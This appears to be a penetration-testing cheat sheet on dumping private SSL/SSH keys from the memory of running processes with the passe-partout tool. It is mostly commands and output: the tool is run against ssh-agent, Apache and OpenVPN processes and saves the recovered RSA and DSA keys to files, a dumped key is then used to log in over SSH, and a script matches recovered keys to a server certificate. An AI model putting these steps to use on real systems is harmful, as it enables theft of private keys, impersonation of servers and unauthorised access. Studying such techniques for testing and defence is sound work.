SSL Keys extraction
===================

### Resources


https://github.com/aviat/passe-partout

### Extraction

##### SSH Agent


$ sudo ./passe-partout 4712
Target has pid 4712
on_signal(17 - SIGCHLD) from 4712
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[X] Valid RSA key found.
[X] Key saved to file id_rsa-0.key
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
done for pid 4712


OpenSSH_4.3p2 Debian-6, OpenSSL 0.9.8e 23 Feb 2007
debug1: Reading configuration data /dev/null
debug1: Connecting to 192.168.0.1 [192.168.0.1] port 22.
debug1: Connection established.
debug1: identity file myplain.key type -1
[...]
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: Trying private key: myplain.key                          <===
debug1: read PEM private key done: type RSA                      <===
debug1: Authentication succeeded (publickey).                    <===
debug1: channel 0: new [client-session]
debug1: Entering interactive session.

Last login: Wed Aug 22 17:16:00 2007 from 192.168.0.51
admin@192.168.0.1:~$

##### Apache


$ ./passe-partout 29960
Target has pid 29960
on_signal(17 - SIGCHLD) from 29960
[-] invalid DSA key.
[-] invalid DSA key.
[...]
[-] unable to check key.
[-] unable to check key.
[X] Valid DSA key found.
[X] Key saved to file id_dsa-0.key
[-] unable to check key.
[...]
[X] Valid DSA key found.
[X] Key saved to file id_dsa-26.key
[...]
[X] Valid RSA key found.
[X] Key saved to file id_rsa-0.key
[...]
[X] Valid RSA key found.
[X] Key saved to file id_rsa-2.key
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
done for pid 29960
$ ls *key
id_dsa-0.key   id_dsa-15.key  id_dsa-20.key  id_dsa-26.key  id_dsa-7.key
id_dsa-10.key  id_dsa-16.key  id_dsa-21.key  id_dsa-2.key   id_dsa-8.key
id_dsa-11.key  id_dsa-17.key  id_dsa-22.key  id_dsa-3.key   id_dsa-9.key
id_dsa-12.key  id_dsa-18.key  id_dsa-23.key  id_dsa-4.key   id_rsa-0.key
id_dsa-13.key  id_dsa-19.key  id_dsa-24.key  id_dsa-5.key   id_rsa-1.key
id_dsa-14.key  id_dsa-1.key   id_dsa-25.key  id_dsa-6.key   id_rsa-2.key

# Finding manually which key is correct
$ openssl s_client -connect localhost:443> server_certificate.txt
depth=0 /CN=ubuntu
verify error:num=18:self signed certificate
verify return:1
depth=0 /CN=ubuntu
verify return:1

# or by letting the script obtaning the certificate itself
$ ruby match_private_key.rb server_certificate.txt
id_rsa-2.key$ ruby match_private_key.rb https://server.fr
id_rsa-2.key

##### OpenVPN


$ ps aux|grep openvpn
root     30006  0.0  0.1   5116  3060 pts/25   S+   14:54   0:00 openvpn openvpn.config
user       31179  0.0  0.0   3056   824 pts/22   R+   15:02   0:00 grep --color openvpn

$ sudo ./passe-partout 30006
Target has pid 30006
testing /lib/tls/i686/cmov/libc-2.10.1.so (0x251000)
testing anonymous (0x252000)
testing /lib/i686/cmov/libcrypto.so.0.9.8 (0x4ea000)
testing anonymous (0x4f7000)
testing /usr/lib/liblzo2.so.2.0.0 (0x747000)
testing /lib/libz.so.1.2.3.3 (0x794000)
testing /lib/tls/i686/cmov/libpthread-2.10.1.so (0x979000)
testing anonymous (0x97a000)
testing /lib/ld-2.10.1.so (0xc0f000)
testing /lib/tls/i686/cmov/libdl-2.10.1.so (0xc52000)
testing /lib/i686/cmov/libssl.so.0.9.8 (0xd82000)
testing /usr/lib/libpkcs11-helper.so.1.0.0 (0xf7b000)
testing /usr/sbin/openvpn (0x80c0000)
testing anonymous (0x80c1000)
testing [heap] (0x85c3000)
[X] Valid RSA key found.
[X] Key saved to file id_rsa-0.key
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
[-] invalid DSA key.
testing anonymous (0xb7754000)
testing anonymous (0xb778f000)
testing [stack] (0xbfdab000)
done for pid 30006
